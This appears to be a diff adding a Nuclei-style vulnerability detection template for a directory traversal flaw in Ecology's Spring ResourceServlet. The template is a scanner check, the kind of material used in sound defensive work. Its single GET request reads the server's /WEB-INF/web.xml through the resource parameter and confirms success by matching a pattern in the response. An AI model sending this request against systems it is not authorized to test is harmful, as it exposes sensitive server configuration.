@@ -1,0 +1,24 @@
+id: ecology-springframework-directory-traversal
+
+info:
+  name: Ecology Springframework Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: directory-traversal
+  description: |
+    Detects directory traversal vulnerability in Ecology Springframework that allows access to sensitive files.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<url-pattern>/weaver/"
